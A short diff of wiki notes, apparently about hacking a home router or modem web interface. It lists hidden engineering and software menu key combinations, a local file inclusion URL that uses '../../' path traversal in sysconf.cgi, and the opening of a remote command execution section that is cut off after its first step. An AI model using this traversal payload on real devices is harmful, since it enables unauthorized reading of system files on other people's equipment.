@@ -1,7 +1,7 @@
 == WebUI Tricks ==
   * Engineering Menu: move your mouse over the device image, then hold ctrl+shift+e and click
   * Software Menu: move your mouse over the device image, then hold ctrl+alt+h
-  * LFI: http://192.168.15.1/cgi-bin/sysconf.cgi?page=../../<afile>&action=request&sid=<sid from a valid request>&timestamp=<valid timestamp>
+  * LFI: http://192.168.15.1/cgi-bin/sysconf.cgi?page=../../[afile]&action=request&sid=[sid from a valid request]&timestamp=[valid timestamp]
 
 == Remote Command Execution ==
   # load up TamperData, Charles, or some other tampering proxy
